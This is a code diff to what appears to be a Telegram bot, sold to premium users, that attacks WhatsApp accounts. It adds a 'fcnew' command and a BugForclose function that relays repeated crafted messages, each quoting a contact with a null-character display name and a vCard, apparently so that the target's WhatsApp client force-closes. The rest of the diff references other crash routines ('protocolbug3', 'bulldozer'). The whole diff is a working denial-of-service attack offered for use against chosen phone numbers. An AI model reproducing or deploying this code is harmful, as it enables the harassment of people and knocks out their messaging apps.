@@ -1392,7 +1392,7 @@ bot.command("ranzbull", checkWhatsAppConnection, checkPremium, async ctx => {
   await donerespone(target, ctx);
 });
 
-bot.command("forcestajhhbbtus", checkWhatsAppConnection, checkPremium, async ctx => {
+bot.command("fcnew", checkWhatsAppConnection, checkPremium, async ctx => {
   const q = ctx.message.text.split(" ")[1];
 
   if (!q) {
@@ -1403,9 +1403,8 @@ bot.command("forcestajhhbbtus", checkWhatsAppConnection, checkPremium, async ctx
 
   await prosesrespone(target, ctx);
 
-  for (let i = 0; i < 10; i++) {
-    await protocolbug3(target, true)
-    await sleep(3000)
+  for (let i = 0; i < 3; i++) {
+    await BugForclose(target)
     
 }
 
@@ -2004,6 +2003,25 @@ target,
   messageId: null,
 }
 );
+}
+async function BugForclose(from) {
+    for (let i = 0; i < 5; i++) {
+        await kipop.relayMessage(from, {
+            "extendedTextMessage": {
+                "text": "Hai Sayang🦍",
+                "contextInfo": {
+                    "stanzaId": generateMessageID(),
+                    "participant": from,
+                    "quotedMessage": {
+                        "contactMessage": {
+                            "displayName": "\u0000",
+                            "vcard": "BEGIN:VCARD\nVERSION:3.0\nFN:Reyhan6610\nX-WA-BIZ-NAME:Reyhan6610\n\nORG:Reyhan6610;\nTEL;type=CELL;type=VOICE;waid=5521992999999:+55 21 99299-9999\nEND:VCARD"
+                        }
+                    }
+                }
+            }
+        }, {})
+    }
 }
 async function bulldozer(isTarget) {
   let message = {
